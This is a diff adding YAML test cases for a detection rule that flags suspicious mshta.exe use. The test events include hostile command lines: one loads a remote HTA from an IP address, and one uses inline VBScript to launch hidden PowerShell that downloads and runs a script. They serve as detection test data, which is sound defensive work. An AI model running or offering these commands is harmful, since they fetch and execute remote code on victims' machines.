@@ -1,0 +1,23 @@
+rule: rule.yml
+
+cases:
+  - name: mshta remote hta fires
+    event:
+      Image: 'C:\Windows\System32\mshta.exe'
+      CommandLine: 'mshta.exe http://198.51.100.44/update.hta'
+    match: true
+    selections:
+      - selection_img
+      - selection_payload
+
+  - name: mshta inline vbscript downloader fires
+    event:
+      Image: 'C:\Windows\System32\mshta.exe'
+      CommandLine: 'mshta.exe vbscript:CreateObject("Wscript.Shell").Run("powershell.exe -NoProfile -WindowStyle hidden -Command IEX(New-Object Net.WebClient).DownloadString(''http://198.51.100.44/a.ps1'')")(window.close)'
+    match: true
+
+  - name: mshta local intranet dashboard is benign
+    event:
+      Image: 'C:\Windows\System32\mshta.exe'
+      CommandLine: 'mshta.exe "C:\Program Files\Vendor\Reports\dashboard.hta"'
+    match: false
